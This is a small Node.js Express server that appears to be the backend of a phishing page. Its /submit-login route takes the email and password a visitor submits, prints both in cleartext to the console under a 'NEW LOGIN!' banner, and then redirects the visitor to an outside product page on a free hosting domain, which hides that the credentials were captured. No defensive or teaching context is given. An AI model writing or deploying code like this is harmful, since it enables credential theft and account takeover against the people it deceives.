const express = require('express');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/submit-login', (req, res) => {
  const { email, password } = req.body;
  
  console.log('\n🔐 NEW LOGIN!');
  console.log('Email:', email);
  console.log('Password:', password);
  console.log('Time:', new Date().toISOString());
  
  res.redirect('http://edclefftrade.byethosts.com/view.product.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
